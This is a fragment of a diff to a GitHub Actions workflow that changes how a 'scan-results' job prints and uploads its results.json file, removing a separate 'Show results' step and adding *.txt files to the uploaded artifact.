+            cat results.json
+          else
+            echo "No results.json found"
+          fi
       
       - name: Upload results
         uses: actions/upload-artifact@v4
         if: always()
         with:
           name: scan-results
-          path: results.json
-      
-      - name: Show results
-        if: always()
-        run: |
-          echo "=== Final Results ==="
-          if [ -f results.json ]; then
-            cat results.json
-            echo ""
-            echo "Results file size:"
-            ls -lh results.json
-          else
-            echo "ERROR: results.json not found!"
-            echo "Files in current directory:"
-            ls -la
-          fi
+          path: |
+            results.json
+            *.txt
